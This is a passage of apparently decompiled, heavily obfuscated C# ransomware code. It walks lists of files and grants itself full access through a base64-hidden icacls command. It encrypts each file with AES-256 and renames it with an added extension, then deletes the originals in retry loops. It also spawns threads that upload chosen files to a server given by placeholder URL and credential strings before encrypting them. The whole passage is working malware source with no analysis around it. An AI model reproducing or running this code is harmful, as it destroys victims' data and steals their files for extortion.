			list = HbVPzLeHIOQ(PSwRXleFGKXEeLaIV, ZBPvBvjVnZug, uDLZanSXUUkH, orehlDHfYrgidjcT, mtmCXYDmwvKxt);
			return;
		}
		list = JhqhtdioqUce.SearchFiles(PSwRXleFGKXEeLaIV);
		foreach (string text in ZBPvBvjVnZug)
		{
			foreach (string item in list)
			{
				if (orehlDHfYrgidjcT.Length != 0)
				{
					int num = 0;
					while (num < orehlDHfYrgidjcT.Length)
					{
						string value = orehlDHfYrgidjcT[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f3;
					}
				}
				if ((UunaEKfJQyJj == "NO" && !item.EndsWith(text)) || ShmRLOSlbOEEzcZ.Contains(item))
				{
					continue;
				}
				if (KHFqRGVrKXYwzu == "YES")
				{
					try
					{
						if (WZhpvictZiGEM.ZHMKrLAFScGR(item))
						{
							WZhpvictZiGEM.xXyRUeNTcwhWhzK(item);
						}
					}
					catch
					{
					}
				}
				ShmRLOSlbOEEzcZ.Add(item);
				if (!PaviRzoDrHSF.Contains(Path.GetDirectoryName(item)))
				{
					PaviRzoDrHSF.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (IGzafCiUvTKnTs == "YES" && fileStream.Length > Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024 && !list3.Contains(text))
					{
						if (prkXlzmtQDXa == "YES")
						{
							foreach (string item2 in LWncuBZUPCH)
							{
								if (item.ToLower().EndsWith(item2) && CUgGjDJJsuh == "YES")
								{
									if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && CUgGjDJJsuh == "NO")
								{
									try
									{
										HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] gKtoFulwUW = mfItpThRjVteK.fihHPRoCTnieNGb(item, Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024);
						byte[] wSHuoUgoZPPZA = mfItpThRjVteK.ZzukpnbfIFX(gKtoFulwUW, Encoding.ASCII.GetBytes(mtmCXYDmwvKxt), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						mfItpThRjVteK.ZhJOAFGjrk(item, wSHuoUgoZPPZA);
						if (uDLZanSXUUkH != ".*")
						{
							File.Move(item, item + uDLZanSXUUkH);
						}
					}
					else if (uDLZanSXUUkH != ".*")
					{
						ALbxrIWGYuKXz(item, item + uDLZanSXUUkH, IyxuTzyTKqYlHzna);
					}
					else
					{
						ALbxrIWGYuKXz(item, item + ".part", IyxuTzyTKqYlHzna);
					}
				}
				catch (Exception)
				{
				}
				IL_02f3:;
			}
		}
	}

	public static void IWNdcDVfxJOhu(List<string> UhSUELvWpYTM, string[] gZlzvovKZqCM, string uQSiBRbsHZNfpLnCD, string[] raEKRTWelGzSq, string HEMNYhkdWgoGYld)
	{
		List<string> DaEJCOGJeLp = new List<string> { "" };
		if (UunaEKfJQyJj == "NO")
		{
			string dfCgBqQlTBY;
			Parallel.ForEach(gZlzvovKZqCM, delegate(string t1)
			{
				foreach (string item in UhSUELvWpYTM)
				{
					if (raEKRTWelGzSq.Length != 0)
					{
						string[] array4 = raEKRTWelGzSq;
						int num2 = 0;
						while (num2 < array4.Length)
						{
							string value2 = array4[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_07dd;
						}
					}
					try
					{
						if (item.EndsWith(uQSiBRbsHZNfpLnCD))
						{
							goto IL_07dd;
						}
					}
					catch (Exception)
					{
						goto IL_07dd;
					}
					if (item.EndsWith(t1) && !ShmRLOSlbOEEzcZ.Contains(item))
					{
						if (KHFqRGVrKXYwzu == "YES")
						{
							try
							{
								if (WZhpvictZiGEM.ZHMKrLAFScGR(item))
								{
									WZhpvictZiGEM.xXyRUeNTcwhWhzK(item);
								}
							}
							catch
							{
							}
						}
						ShmRLOSlbOEEzcZ.Add(item);
						if (!PaviRzoDrHSF.Contains(Path.GetDirectoryName(item)))
						{
							PaviRzoDrHSF.Add(Path.GetDirectoryName(item));
						}
						TIDacAxcfWvb(item);
						try
						{
							new sUtmdNLRyLBV().gsCnkMATdlEVHOMh(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (nSLCvWTPGScIDK)
									{
										Console.WriteLine("Setting write access permission: " + item + " - File Size: " + new FileInfo(item).Length + " bytes");
										Console.WriteLine("----------------------------------------------------------------------------");
									}
								}
								catch
								{
								}
								oapSGNsteEjKT(CZuAqRlrrEeJTK("aWNhY2xzLmV4ZQ=="), "\"" + item + "\"" + CZuAqRlrrEeJTK("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + CZuAqRlrrEeJTK("OkYgL1QgL0MgL1E="));
							}
						}
						catch (Exception ex16)
						{
							if (QWMTAZEOVrAU)
							{
								try
								{
									File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while checking for user write access permission: " + ex16.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_0237;
								}
								goto end_IL_0237_2;
								end_IL_0237:;
							}
							catch (Exception ex18)
							{
								if (QWMTAZEOVrAU)
								{
									try
									{
										File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while reading if filesize is zero: " + ex18.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								NksflcjUNFsBl++;
								goto end_IL_0237_2;
							}
							if (!(IGzafCiUvTKnTs == "YES") || new FileInfo(item).Length <= Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024 || DaEJCOGJeLp.Contains(t1))
							{
								if (tQdFbIlBsTQIR)
								{
									uQSiBRbsHZNfpLnCD = AWOVMwfUoZKZmvd + uQSiBRbsHZNfpLnCD;
								}
								string text3 = WlyMRVszoI.zYSkEclrNaZ(32);
								string s3 = ddeFRRDtEqs.wfmtJmcBJJaY(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (uQSiBRbsHZNfpLnCD != ".*")
								{
									if (!qlEzvrxXFN)
									{
										if (!sTRoWRHIVycKW)
										{
											nMyHCDrvezEPVkp(item, item + uQSiBRbsHZNfpLnCD, IyxuTzyTKqYlHzna);
										}
										else
										{
											nMyHCDrvezEPVkp(item, item + uQSiBRbsHZNfpLnCD, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!sTRoWRHIVycKW)
											{
												wRzXnziDJBJgwL(item, item + uQSiBRbsHZNfpLnCD, IyxuTzyTKqYlHzna);
											}
											else
											{
												wRzXnziDJBJgwL(item, item + uQSiBRbsHZNfpLnCD, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex20)
										{
											if (QWMTAZEOVrAU)
											{
												try
												{
													File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while fully writing to file: " + ex20.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
											NksflcjUNFsBl++;
											try
											{
												File.Move(item + uQSiBRbsHZNfpLnCD, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_0237_2;
										}
									}
								}
								else if (!qlEzvrxXFN)
								{
									if (!sTRoWRHIVycKW)
									{
										nMyHCDrvezEPVkp(item, item + ".part", IyxuTzyTKqYlHzna);
									}
									else
									{
										nMyHCDrvezEPVkp(item, item + ".part", Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!sTRoWRHIVycKW)
										{
											wRzXnziDJBJgwL(item, item, IyxuTzyTKqYlHzna);
										}
										else
										{
											wRzXnziDJBJgwL(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex23)
									{
										if (QWMTAZEOVrAU)
										{
											try
											{
												File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while fully writing to file: " + ex23.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										NksflcjUNFsBl++;
										goto end_IL_0237_2;
									}
								}
								if (sTRoWRHIVycKW)
								{
									if (uQSiBRbsHZNfpLnCD != ".*")
									{
										ulcCGCvziBPMSJ(item + uQSiBRbsHZNfpLnCD, bytes3);
									}
									else
									{
										ulcCGCvziBPMSJ(item, bytes3);
									}
								}
								goto IL_07dd;
							}
							try
							{
								if (uQSiBRbsHZNfpLnCD != ".*")
								{
									if (tQdFbIlBsTQIR)
									{
										uQSiBRbsHZNfpLnCD = AWOVMwfUoZKZmvd + uQSiBRbsHZNfpLnCD;
									}
									File.Move(item, item + uQSiBRbsHZNfpLnCD);
								}
							}
							catch (Exception ex25)
							{
								if (QWMTAZEOVrAU)
								{
									try
									{
										File.AppendAllText(kOKakAljNFiEE, "File: " + item + " - Error while renaming to crypted extension: " + ex25.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								NksflcjUNFsBl++;
								goto end_IL_0237_2;
							}
							dfCgBqQlTBY = "";
							if (uQSiBRbsHZNfpLnCD != ".*")
							{
								dfCgBqQlTBY = item + uQSiBRbsHZNfpLnCD;
							}
							else
							{
								dfCgBqQlTBY = item;
							}
							if (prkXlzmtQDXa == "YES")
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in LWncuBZUPCH)
									{
										if (dfCgBqQlTBY.ToLower().EndsWith(item2 + uQSiBRbsHZNfpLnCD) && CUgGjDJJsuh == "YES")
										{
											if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > new FileInfo(dfCgBqQlTBY).Length)
											{
												try
												{
													HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dfCgBqQlTBY);
												}
												catch
												{
												}
											}
										}
										else if (dfCgBqQlTBY.ToLower().EndsWith(item2) && CUgGjDJJsuh == "NO")
										{
											try
											{
												HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dfCgBqQlTBY);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = WlyMRVszoI.zYSkEclrNaZ(32);
							string s4 = ddeFRRDtEqs.wfmtJmcBJJaY(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							byte[] array5 = null;
							byte[] array6 = mfItpThRjVteK.fihHPRoCTnieNGb(dfCgBqQlTBY, Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024);
							if (mfItpThRjVteK.ZhJOAFGjrk(wSHuoUgoZPPZA: (!JeyEmTDKUFo) ? (sTRoWRHIVycKW ? mfItpThRjVteK.ZzukpnbfIFX(array6, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mfItpThRjVteK.ZzukpnbfIFX(array6, Encoding.ASCII.GetBytes(HEMNYhkdWgoGYld), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sTRoWRHIVycKW ? fCAALXQgidNAFTY.RvZPYPusPqBFZy(array6, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fCAALXQgidNAFTY.RvZPYPusPqBFZy(array6, Encoding.ASCII.GetBytes(HEMNYhkdWgoGYld), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JAYdEktfsDX: dfCgBqQlTBY, KTdbjFMhpnp: bytes4))
							{
								goto IL_07dd;
							}
							try
							{
								File.Move(item + uQSiBRbsHZNfpLnCD, item);
							}
							catch (Exception)
							{
							}
							end_IL_0237_2:;
						}
						catch (Exception)
						{
							goto IL_07dd;
						}
					}
					continue;
					IL_07dd:
					UhSUELvWpYTM.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(UhSUELvWpYTM, delegate(string fileInfo)
		{
			if (raEKRTWelGzSq.Length != 0)
			{
				string[] array = raEKRTWelGzSq;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_08a9;
				}
			}
			try
			{
				if (fileInfo.EndsWith(uQSiBRbsHZNfpLnCD))
				{
					goto IL_08a9;
				}
			}
			catch (Exception)
			{
				goto IL_08a9;
			}
			if (!ShmRLOSlbOEEzcZ.Contains(fileInfo))
			{
				if (KHFqRGVrKXYwzu == "YES")
				{
					try
					{
						if (WZhpvictZiGEM.ZHMKrLAFScGR(fileInfo))
						{
							WZhpvictZiGEM.xXyRUeNTcwhWhzK(fileInfo);
						}
					}
					catch
					{
					}
				}
				ShmRLOSlbOEEzcZ.Add(fileInfo);
				if (!PaviRzoDrHSF.Contains(Path.GetDirectoryName(fileInfo)))
				{
					PaviRzoDrHSF.Add(Path.GetDirectoryName(fileInfo));
				}
				TIDacAxcfWvb(fileInfo);
				try
				{
					new sUtmdNLRyLBV().gsCnkMATdlEVHOMh(fileInfo);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (nSLCvWTPGScIDK)
							{
								Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						oapSGNsteEjKT(CZuAqRlrrEeJTK("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + CZuAqRlrrEeJTK("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + CZuAqRlrrEeJTK("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (QWMTAZEOVrAU)
					{
						try
						{
							File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_0284;
						}
						goto end_IL_0284_2;
						end_IL_0284:;
					}
					catch (Exception ex4)
					{
						if (QWMTAZEOVrAU)
						{
							try
							{
								File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						NksflcjUNFsBl++;
						goto end_IL_0284_2;
					}
					if (IGzafCiUvTKnTs == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024)
					{
						try
						{
							if (uQSiBRbsHZNfpLnCD != ".*")
							{
								if (tQdFbIlBsTQIR)
								{
									uQSiBRbsHZNfpLnCD = AWOVMwfUoZKZmvd + uQSiBRbsHZNfpLnCD;
								}
								File.Move(fileInfo, fileInfo + uQSiBRbsHZNfpLnCD);
							}
						}
						catch (Exception ex6)
						{
							if (QWMTAZEOVrAU)
							{
								try
								{
									File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							NksflcjUNFsBl++;
							return;
						}
						if (uQSiBRbsHZNfpLnCD != ".*")
						{
							fileInfo += uQSiBRbsHZNfpLnCD;
						}
						if (prkXlzmtQDXa == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in LWncuBZUPCH)
								{
									if (fileInfo.ToLower().EndsWith(item3 + uQSiBRbsHZNfpLnCD) && CUgGjDJJsuh == "YES")
									{
										if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item3) && CUgGjDJJsuh == "NO")
									{
										try
										{
											HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = WlyMRVszoI.zYSkEclrNaZ(32);
						string s = ddeFRRDtEqs.wfmtJmcBJJaY(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = mfItpThRjVteK.fihHPRoCTnieNGb(fileInfo, Convert.ToInt32(YROKpHBeSOV) * 1024 * 1024);
						if (!mfItpThRjVteK.ZhJOAFGjrk(wSHuoUgoZPPZA: (!JeyEmTDKUFo) ? (sTRoWRHIVycKW ? mfItpThRjVteK.ZzukpnbfIFX(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mfItpThRjVteK.ZzukpnbfIFX(array3, Encoding.ASCII.GetBytes(HEMNYhkdWgoGYld), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sTRoWRHIVycKW ? fCAALXQgidNAFTY.RvZPYPusPqBFZy(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fCAALXQgidNAFTY.RvZPYPusPqBFZy(array3, Encoding.ASCII.GetBytes(HEMNYhkdWgoGYld), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JAYdEktfsDX: fileInfo, KTdbjFMhpnp: bytes))
						{
							try
							{
								File.Move(fileInfo + uQSiBRbsHZNfpLnCD, fileInfo);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (tQdFbIlBsTQIR)
						{
							uQSiBRbsHZNfpLnCD = AWOVMwfUoZKZmvd + uQSiBRbsHZNfpLnCD;
						}
						string text2 = WlyMRVszoI.zYSkEclrNaZ(32);
						string s2 = ddeFRRDtEqs.wfmtJmcBJJaY(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (uQSiBRbsHZNfpLnCD != ".*")
						{
							if (!qlEzvrxXFN)
							{
								if (!sTRoWRHIVycKW)
								{
									nMyHCDrvezEPVkp(fileInfo, fileInfo + uQSiBRbsHZNfpLnCD, IyxuTzyTKqYlHzna);
								}
								else
								{
									nMyHCDrvezEPVkp(fileInfo, fileInfo + uQSiBRbsHZNfpLnCD, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!sTRoWRHIVycKW)
									{
										wRzXnziDJBJgwL(fileInfo, fileInfo + uQSiBRbsHZNfpLnCD, IyxuTzyTKqYlHzna);
									}
									else
									{
										wRzXnziDJBJgwL(fileInfo, fileInfo + uQSiBRbsHZNfpLnCD, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (QWMTAZEOVrAU)
									{
										try
										{
											File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while fully writing to file: " + ex9.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									NksflcjUNFsBl++;
									try
									{
										File.Move(fileInfo + uQSiBRbsHZNfpLnCD, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!qlEzvrxXFN)
						{
							if (!sTRoWRHIVycKW)
							{
								nMyHCDrvezEPVkp(fileInfo, fileInfo + ".part", IyxuTzyTKqYlHzna);
							}
							else
							{
								nMyHCDrvezEPVkp(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!sTRoWRHIVycKW)
								{
									wRzXnziDJBJgwL(fileInfo, fileInfo, IyxuTzyTKqYlHzna);
								}
								else
								{
									wRzXnziDJBJgwL(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (QWMTAZEOVrAU)
								{
									try
									{
										File.AppendAllText(kOKakAljNFiEE, "File: " + fileInfo + " - Error while fully writing to file: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								NksflcjUNFsBl++;
								return;
							}
						}
						if (sTRoWRHIVycKW)
						{
							if (uQSiBRbsHZNfpLnCD != ".*")
							{
								ulcCGCvziBPMSJ(fileInfo + uQSiBRbsHZNfpLnCD, bytes2);
							}
							else
							{
								ulcCGCvziBPMSJ(fileInfo, bytes2);
							}
						}
					}
					end_IL_0284_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_08a9;
			IL_08a9:
			UhSUELvWpYTM.Remove(fileInfo);
		});
	}

	private static void ALbxrIWGYuKXz(string dMCJMyIwFMnWS, string VbOeTbMbNkrQ, byte[] xWnxQUYUMiG)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(VbOeTbMbNkrQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(xWnxQUYUMiG, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(dMCJMyIwFMnWS, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (VbOeTbMbNkrQ.Length > 0)
				{
					FileStream fileStream3 = new FileStream(dMCJMyIwFMnWS, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (prkXlzmtQDXa == "YES")
					{
						foreach (string item in LWncuBZUPCH)
						{
							if (dMCJMyIwFMnWS.ToLower().EndsWith(item) && CUgGjDJJsuh == "YES")
							{
								if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dMCJMyIwFMnWS);
									}
									catch
									{
									}
								}
							}
							else if (dMCJMyIwFMnWS.ToLower().EndsWith(item) && CUgGjDJJsuh == "NO")
							{
								try
								{
									HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", dMCJMyIwFMnWS);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(dMCJMyIwFMnWS) && num2 >= 0)
							{
								File.Delete(dMCJMyIwFMnWS);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (VbOeTbMbNkrQ.EndsWith(".part"))
					{
						File.Move(VbOeTbMbNkrQ, VbOeTbMbNkrQ.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(VbOeTbMbNkrQ);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void wRzXnziDJBJgwL(string lAnzMiFaptjfWaa, string GFQZwaeLOuaK, byte[] ELhAkHwEKZQqOP)
	{
		try
		{
			if (prkXlzmtQDXa == "YES")
			{
				FileStream fileStream = new FileStream(lAnzMiFaptjfWaa, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in LWncuBZUPCH)
				{
					if (lAnzMiFaptjfWaa.ToLower().EndsWith(item) && CUgGjDJJsuh == "YES")
					{
						if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", lAnzMiFaptjfWaa);
							}
							catch
							{
							}
						}
					}
					else if (lAnzMiFaptjfWaa.ToLower().EndsWith(item) && CUgGjDJJsuh == "NO")
					{
						try
						{
							HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", lAnzMiFaptjfWaa);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (lAnzMiFaptjfWaa != GFQZwaeLOuaK)
		{
			File.Move(lAnzMiFaptjfWaa, GFQZwaeLOuaK);
			lAnzMiFaptjfWaa = GFQZwaeLOuaK;
		}
		byte[] bytes = fCAALXQgidNAFTY.RvZPYPusPqBFZy(File.ReadAllBytes(lAnzMiFaptjfWaa), ELhAkHwEKZQqOP, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(lAnzMiFaptjfWaa, bytes);
		QqDrvjCPIINo++;
	}

	private static void nMyHCDrvezEPVkp(string VxlhDglYQUXmt, string GUKVXKsAJnHthmU, byte[] GGlLykFmLIRM)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = GUKVXKsAJnHthmU;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(GGlLykFmLIRM, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (xCMIeuGeak == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(VxlhDglYQUXmt, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(VxlhDglYQUXmt, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(VxlhDglYQUXmt, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (GUKVXKsAJnHthmU.Length > 0)
				{
					if (prkXlzmtQDXa == "YES")
					{
						FileStream fileStream4 = new FileStream(VxlhDglYQUXmt, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in LWncuBZUPCH)
						{
							if (VxlhDglYQUXmt.ToLower().EndsWith(item) && CUgGjDJJsuh == "YES")
							{
								if (Convert.ToInt32(UusgggfFEiH) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", VxlhDglYQUXmt);
									}
									catch
									{
									}
								}
							}
							else if (VxlhDglYQUXmt.ToLower().EndsWith(item) && CUgGjDJJsuh == "NO")
							{
								try
								{
									HEBapABdzYbQ.bTXRLTCiyGQxgkc("URL", "USERNAME", "ACCESO", VxlhDglYQUXmt);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(VxlhDglYQUXmt);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (GUKVXKsAJnHthmU.EndsWith(".part"))
					{
						File.Move(GUKVXKsAJnHthmU, GUKVXKsAJnHthmU.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(GUKVXKsAJnHthmU))
							{
								File.Delete(GUKVXKsAJnHthmU);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(kOKakAljNFiEE, "File: " + VxlhDglYQUXmt + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
